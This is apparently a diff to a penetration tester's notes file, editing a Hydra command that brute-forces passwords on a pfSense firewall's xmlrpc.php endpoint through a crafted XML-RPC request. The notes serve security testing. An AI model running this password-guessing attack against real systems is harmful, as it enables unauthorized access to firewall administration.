@@ -2166,8 +2166,9 @@
 **** Hydra
      - [[https://github.com/vanhauser-thc/thc-hydra][Site]] - Multi-protocol bruteforcer:
        #+begin_src sh
-         # Use the simplest method
-         hydra -l none -P <wlist> <ip> https-post-form '/xmlrpc.php:<?xml version="1.0"?><methodCall><methodName>pfsense.check_firmware_version</methodName><params><param><value><string>^PASS^</string></value></param></params></methodCall>:failed:H=Content-Type\: text/xml'
+         # Use the simplest xml-rpc method
+         # <wlist> cannot be a pipe
+         hydra -f -l none -P <wlist> <ip> https-post-form '/xmlrpc.php:<?xml version="1.0"?><methodCall><methodName>pfsense.check_firmware_version</methodName><params><param><value><string>^PASS^</string></value></param></params></methodCall>:failed:H=Content-Type\: text/xml'
          # You may have to limit concurrency
          # to avoid crashing the service:
          # -t <n-threads> | -T <n-threads>
